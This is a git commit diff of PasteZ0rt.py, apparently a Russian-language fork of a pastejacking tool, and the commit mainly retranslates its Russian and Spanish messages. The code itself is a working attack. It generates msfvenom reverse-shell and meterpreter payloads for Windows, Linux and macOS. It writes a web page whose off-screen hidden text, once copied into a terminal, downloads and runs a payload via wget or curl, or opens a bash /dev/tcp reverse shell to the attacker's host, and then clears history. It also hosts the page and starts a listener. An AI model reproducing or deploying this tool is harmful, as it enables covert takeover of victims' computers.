5c0df99663764acc21c1a0ce7bcdc8d925953096
Anton <65995394+UnderRussian@users.noreply.github.com>
2020-05-27 13:29:44 +0300

    Update PasteZ0rt.py

--- PasteZ0rt.py
+++ PasteZ0rt.py
@@ -1,12 +1,10 @@
 #!/usr/bin/python
 #-*- coding: utf-8 -*-
 ##############################################################################
-# Создал:ZettaHack
-# Ссылка: https://github.com/ZettaHack/PasteZort.git
-# Контакт: https://www.facebook.com/ZettaHack-568599933346788/
+# Creador de PasteZort: ZettaHack - Seguridad Informatica
+# Referencia: https://github.com/ZettaHack/PasteZort.git
+# Contacto: https://www.facebook.com/ZettaHack-568599933346788/
 #           zettahackz@gmail.com
-#
-#           antonlinux@yandex.ru
 ##############################################################################
 
 
@@ -17,7 +15,7 @@ import atexit
 def Windows():
 
 		print'\033[0;31m'+"""\n-------------------------------------------------------------------
- -> Конфигурация полезной нагрузки:
+ -> Конфигурация нагрузки:
 -------------------------------------------------------------------"""
 		print '\033[0;39m'
 
@@ -44,7 +42,7 @@ def Windows():
 		elif (payload_seleccionado == 4):
 			payload="windows/shell/reverse_tcp"
 		else:
-			print '\033[1;31m'+"Что-то не получилось создать!"
+			print '\033[1;31m'+"¡Opcion invalida!"
 
 
 
@@ -52,38 +50,38 @@ def Windows():
 		port=raw_input("   LPORT= ")
 
 		print '\033[1;31m'+"""\n-------------------------------------------------------------------
- -> Создаю нагрузку...
+ -> Создание...
 -------------------------------------------------------------------"""
 		print '\033[0;39m'
 		proc = subprocess.Popen(["./encode.rb -i "+ip+" -p "+port+" -a "+payload+" -t cmd"], stdout=subprocess.PIPE, shell=True)
 		(out, err) = proc.communicate()
 		print '\033[1;31m'+"""\n-------------------------------------------------------------------
- -> Нагрузка создана!
+ -> Готово!
 -------------------------------------------------------------------"""
 		print '\033[0;39m'
-		Msg=raw_input("   Mensaje 1: ")		
-		Msg=raw_input("   Mensaje 2: ")
+		mensaje1=raw_input("   Сообщение 1: ")		
+		mensaje2=raw_input("   Сообщение 2: ")
 		index="index.html"
 		job=open(index,"w")	
-		job.write("""<p> """+ Msg + """ <span style="position: absolute; left: -2000; top: -100px;" >c:\ & cls & """+out+""" & c:\ & cls <br> """ + Msg + """ </span> """ + Msg + """ </p> """)
+		job.write("""<p> """+ mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >c:\ & cls & """+out+""" & c:\ & cls <br> """ + mensaje1 + """ </span> """ + mensaje2 + """ </p> """)
 		job.close()
 
 		print '\033[1;31m'+"""\n-------------------------------------------------------------------
- -> Введи эти команды в терминал или cmd(какие? смотри на ютуб)"""
+ -> Нагрузка"""
 
 		NombreIndex="index.html"
 		if os.path.isfile(NombreIndex):
 			os.system("rm /var/www/html/index.html")
 			os.system("cp index.html /var/www/html")
 			print '\033[1;31m'+"""-------------------------------------------------------------------
- -> Что-то не смог перевести )))
+ -> Архив доступен в интернете(доступ открыт в инете)
 -------------------------------------------------------------------"""
 		else:
 			os.system("cp index.html /var/www/html")
 			print"""-------------------------------------------------------------------
- -> Что-то не смог перевести )))
+ -> Архив в интернете
 -------------------------------------------------------------------"""
- 		print""" -> URL: http://"""+ip+"""/
+ 		print""" -> Ссылка на все это дело: http://"""+ip+"""/
 -------------------------------------------------------------------"""
 		documento="Handler_Metasploit"
 		archivo = open(documento,"w")
@@ -98,15 +96,15 @@ exploit -j""")
 		iniciar_handler=str(raw_input("   Согласен с правилами? (y/n): "))
 		if (iniciar_handler == 'y'):
 			print '\033[1;31m'+"""\n-------------------------------------------------------------------
- -> Создание(или запуск) handler Metasploit...
+ -> Проверка handler Metasploit...
 -------------------------------------------------------------------"""
 			print '\033[0;39m'
 			os.system("msfconsole -r Handler_Metasploit")
 		elif (iniciar_handler == 'n'):
-			print "\n   Все ок!\n"
+			print "\n   Готово!\n"
 def Linux():
 		print'\033[0;31m'+"""\n-------------------------------------------------------------------
- -> Конфигурация полезной нагрузки:
+ -> Конфиг. нагрузки:
 -------------------------------------------------------------------"""
 		print '\033[0;39m'
 		NombrePayload = "payload.elf"
@@ -115,7 +113,7 @@ def Linux():
 			os.system("rm /var/www/html/payload.elf")
 		if os.path.isfile(NombreIndex):
 			os.system("rm /var/www/html/index.html")
-		payload_seleccionado=int(raw_input("""   Выбери нагрузку:
+		payload_seleccionado=int(raw_input("""   Seleccione Payload:
    [1] linux/x86/meterpreter/reverse_tcp
    [2] linux/x86/shell/reverse_tcp
    [3] linux/x64/shell/reverse_tcp
@@ -129,7 +127,7 @@ def Linux():
 			payload="linux/x64/shell/reverse_tcp"
 
 		else:
-			print '\033[1;31m'+"Что-то не так!"
+			print '\033[1;31m'+"¡Opcion invalida!"
 		ip=raw_input("\n   LHOST= ")
 		port=raw_input("   LPORT= ")
 
@@ -140,31 +138,31 @@ def Linux():
 		os.system("msfvenom -p "+payload+" LHOST=" + ip + " LPORT=" + port + " -f elf > /var/www/html/payload.elf")
 		
 		print '\033[1;31m'+"""-------------------------------------------------------------------
- -> нагрузка создана!
+ -> Готово!
 -------------------------------------------------------------------"""
 		print '\033[0;39m'
-		Msg=raw_input("   Сообщение 1: ")
-		Msg=raw_input("   Сообщение 2: ")
+		mensaje1=raw_input("   Сообщение 1: ")
+		mensaje2=raw_input("   Сообщение 2: ")
 		NombreIndex="index.html"
 		job=open(NombreIndex,"w")	
-		job.write("""<p> """ + Msg + """ <span style="position: absolute; left: -2000; top: -100px;" >/dev/null; clear; wget http://"""+ip+"""/payload.elf &> /dev/null && chmod +x ./payload.elf && ./payload.elf & disown && clear <br> """ + Msg + """ </span> """ + Msg + """ </p>""")
+		job.write("""<p> """ + mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >/dev/null; clear; wget http://"""+ip+"""/payload.elf &> /dev/null && chmod +x ./payload.elf && ./payload.elf & disown && clear <br> """ + mensaje1 + """ </span> """ + mensaje2 + """ </p>""")
 		job.close()
 
 		print '\033[1;31m'+"""\n-------------------------------------------------------------------
- -> Не понял)))"""
+ -> Нагрузка в интернете"""
 
 		if os.path.isfile("/var/www/html/index.html"):
 			os.system("rm /var/www/html/index.html")
 			os.system("cp index.html /var/www/html")
 			print '\033[1;31m'+"""-------------------------------------------------------------------
- -> Тут так же
+ -> Нагрузка доступна для интернета
 -------------------------------------------------------------------"""
 		else:
 			os.system("cp index.html /var/www/html")
 			print"""-------------------------------------------------------------------
- -> Archivo index.html copiado en servidor local
+ -> Архив в инете
 -------------------------------------------------------------------"""
- 		print""" -> URL: http://"""+ip+"""/
+ 		print""" -> Ссылка: http://"""+ip+"""/
 -------------------------------------------------------------------"""
 		documento="Handler_msf_Linux"
 		archivo = open(documento,"w")
@@ -177,10 +175,10 @@ exploit -j""")
 		archivo.close()
 
 		print '\033[0;39m'
-		iniciar_handler=str(raw_input("   С правилами согласен? (y/n): "))
+		iniciar_handler=str(raw_input("   Согласен с правилами? (y/n): "))
 		if (iniciar_handler == 'y'):
 			print '\033[1;31m'+"""\n-------------------------------------------------------------------
- ->  Создание(или запуск) handler Metasploit...
+ -> Проверка handler Metasploit...
 -------------------------------------------------------------------"""
 			print '\033[0;39m'
 			os.system("msfconsole -r Handler_msf_Linux")
@@ -193,7 +191,7 @@ def MacOSX():
 		global ejecucion
 		ejecucion="./"
 		print'\033[0;31m'+"""\n-------------------------------------------------------------------
- -> Конфигурация полезной нагрузки:
+ -> Конфиг. нагрузки:
 -------------------------------------------------------------------"""
 		print '\033[0;39m'
 		NombreIndex="index.html"
@@ -228,7 +226,7 @@ def MacOSX():
 			ejecucion="python "
 			ShellMacOSX()
 		else:
-			print '\033[1;31m'+"Упс! Что-то не так!"
+			print '\033[1;31m'+"¡Opcion invalida!"
 def NetcatMacOSX():
 			ip=raw_input("\n   LHOST= ")
 			port=raw_input("   LPORT= ")
@@ -240,48 +238,48 @@ def NetcatMacOSX():
 
 		
 			print '\033[1;31m'+"""-------------------------------------------------------------------
- -> Создано!
+ -> Готово!
 -------------------------------------------------------------------"""
 			print '\033[0;39m'
-			Msg=raw_input("   Сообщение 1: ")
-			Msg=raw_input("   Сообщение 2: ")
+			mensaje1=raw_input("   Сообщение 1: ")
+			mensaje2=raw_input("   Сообщение 2: ")
 			#comando=raw_input("   Comando: ")
 
 			NombreIndex="index.html"
 			job=open(NombreIndex,"w")	
 ##/bin/bash 0"""+"""<"""+"""/dev/tcp/"""+ip+"""/"""+port+""" 1>&0 2>&0 & clear; clear
-			job.write("""<p> """ + Msg + """\n <span style="position: absolute; left: -2000; top: -100px;" >;/bin/bash -i >& /dev/tcp/"""+ip+"""/"""+port+""" 0>&1 & clear; clear; history -c <br> """ + Msg + """ </span> """ + Msg + """ </p>""")
+			job.write("""<p> """ + mensaje1 + """\n <span style="position: absolute; left: -2000; top: -100px;" >;/bin/bash -i >& /dev/tcp/"""+ip+"""/"""+port+""" 0>&1 & clear; clear; history -c <br> """ + mensaje1 + """ </span> """ + mensaje2 + """ </p>""")
 			job.close()
 
 			print '\033[1;31m'+"""\n-------------------------------------------------------------------
- -> Не фига не понимаю!"""
+ -> Нагрузка в интернете"""
 
 			if os.path.isfile("/var/www/html/index.html"):
 				os.system("rm /var/www/html/index.html")
 				os.system("cp index.html /var/www/html")
 				print '\033[1;31m'+"""-------------------------------------------------------------------
- -> :)
+ -> Архив: доступ в интернете
 -------------------------------------------------------------------"""
 			else:
 				os.system("cp index.html /var/www/html")
 				print"""-------------------------------------------------------------------
- -> :/
+ -> Архив - интернет...
 -------------------------------------------------------------------"""
- 			print""" -> URL: http://"""+ip+"""/
+ 			print""" -> Ссылка: http://"""+ip+"""/
 -------------------------------------------------------------------"""
 			print '\033[0;39m'
 			iniciar_handler=str(raw_input("   Согласен с правилами? (y/n): "))
 			if (iniciar_handler == 'y'):
 				print '\033[1;31m'+"""\n-------------------------------------------------------------------
- -> Что-то делаем...
+ -> Проверка и создание функций...
 -------------------------------------------------------------------"""
 				print '\033[0;39m'
 				os.system("nc -lvp "+port)
 			elif (iniciar_handler == 'n'):
-				print "\n   Готово!\n"
+				print "\n   ¡Completado!\n"
 def ShellMacOSX():
 			print'\033[0;31m'+"""\n-------------------------------------------------------------------
- -> Конфигурация нагрузки:
+ -> Конфиг. нагрузки:
 -------------------------------------------------------------------"""
 			print '\033[0;39m'
 			NombrePayload = "osx."+extension
@@ -295,7 +293,7 @@ def ShellMacOSX():
 			port=raw_input("   LPORT= ")
 
 			print '\033[1;31m'+"""\n-------------------------------------------------------------------
- -> Создание...
+ -> Создание нагрузки...
 -------------------------------------------------------------------"""
 			print '\033[0;39m'
 			os.system("msfvenom -p "+payload+" LHOST=" + ip + " LPORT=" + port + " -f "+formato+" > /var/www/html/osx."+extension)
@@ -304,28 +302,28 @@ def ShellMacOSX():
  -> Готово! : """+payload+"""
 -------------------------------------------------------------------"""
 			print '\033[0;39m'
-			Msg=raw_input("   Сообщение 1: ")
-			Msg=raw_input("   Сообщение 2: ")
+			mensaje1=raw_input("   Mensaje 1: ")
+			mensaje2=raw_input("   Mensaje 2: ")
 			NombreIndex="index.html"
 			job=open(NombreIndex,"w")	
-			job.write("""<p> """ + Msg + """ <span style="position: absolute; left: -2000; top: -100px;" >;curl -O http://"""+ip+"""/osx."""+extension+""";chmod +x osx."""+extension+""";"""+ejecucion+"""osx."""+extension+""" & history -c;clear <br> """ + Msg + """ </span> """ + Msg + """ </p>""")
+			job.write("""<p> """ + mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >;curl -O http://"""+ip+"""/osx."""+extension+""";chmod +x osx."""+extension+""";"""+ejecucion+"""osx."""+extension+""" & history -c;clear <br> """ + mensaje1 + """ </span> """ + mensaje2 + """ </p>""")
 			job.close()
 
 			print '\033[1;31m'+"""\n-------------------------------------------------------------------
- -> Ничего не скажу"""
+ -> Нагрузка в интернете"""
 
 			if os.path.isfile("/var/www/html/index.html"):
 				os.system("rm /var/www/html/index.html")
 				os.system("cp index.html /var/www/html")
 				print '\033[1;31m'+"""-------------------------------------------------------------------
- -> ...
+ -> Архив: доступ в интернете
 -------------------------------------------------------------------"""
 			else:
 				os.system("cp index.html /var/www/html")
 				print"""-------------------------------------------------------------------
- -> !...!
+ -> Архив - интернет...
 -------------------------------------------------------------------"""
- 			print""" -> URL: http://"""+ip+"""/
+ 			print""" -> Ссылка: http://"""+ip+"""/
 -------------------------------------------------------------------"""
 			documento="Handler_msf_MacOSX"
 			archivo = open(documento,"w")
@@ -338,15 +336,15 @@ exploit -j""")
 			archivo.close()
 
 			print '\033[0;39m'
-			iniciar_handler=str(raw_input("   Согласен с правилами? (y/n): "))
+			iniciar_handler=str(raw_input("   ¿Desea iniciar el handler? (y/n): "))
 			if (iniciar_handler == 'y'):
 				print '\033[1;31m'+"""\n-------------------------------------------------------------------
- -> Что-то делаем с handler Metasploit...
+ -> Проверка handler Metasploit...
 -------------------------------------------------------------------"""
 				print '\033[0;39m'
 				os.system("msfconsole -r Handler_msf_MacOSX")
 			elif (iniciar_handler == 'n'):
-				print "\n   Готово!\n"
+				print "\n   ¡Completado!\n"
 os.system("clear")
 print """ _________________________________________________________________
 | --------------------------------------------------------------- |
@@ -356,7 +354,7 @@ print """ _________________________________________________________________
 ||           |  __/ (_| \__ \ ||  __// /| (_) | |  | |_          ||
 ||           |_|   \__,_|___/\__\___/____\___/|_|   \__|         ||
 ||                           -----------                         ||
-||            rusVer         |v| |1|.|0|         rusVer          ||
+||                 rusVer    |v| |0|.|1|    rusVer               ||
 ||                           -----------                         ||
 ||           ______    _   _        _    _            _          ||
 ||          |___  /   | | | |      | |  | |          | |         ||
@@ -369,18 +367,18 @@ print """ _________________________________________________________________
 |_________________________________________________________________|
 """
 print'\033[1;31m'+"""-------------------------------------------------------------------
- -> Привет!:
+ -> Iniciando servidor Apache:
 -------------------------------------------------------------------"""
 +os.system("service apache2 start")
 
-print """ -> Как дела?
+print """ -> ¡Apache Listo!
 -------------------------------------------------------------------"""
 print '\033[0;39m'
-OS_Objetivo=int(raw_input("""   Выбор ос:
+OS_Objetivo=int(raw_input("""   Выбор системы:
    [1] Windows
    [2] Linux
    [3] Mac OSX
-   Objetivo: """))
+   Номер OS: """))
 
 if (OS_Objetivo == 1):
 	Windows()
@@ -389,4 +387,4 @@ elif (OS_Objetivo == 2):
 elif (OS_Objetivo == 3):
 	MacOSX()
 else:
-	print '\033[1;31m'+"Чета тут не так!"
+	print '\033[1;31m'+"¡Opcion invalida!"
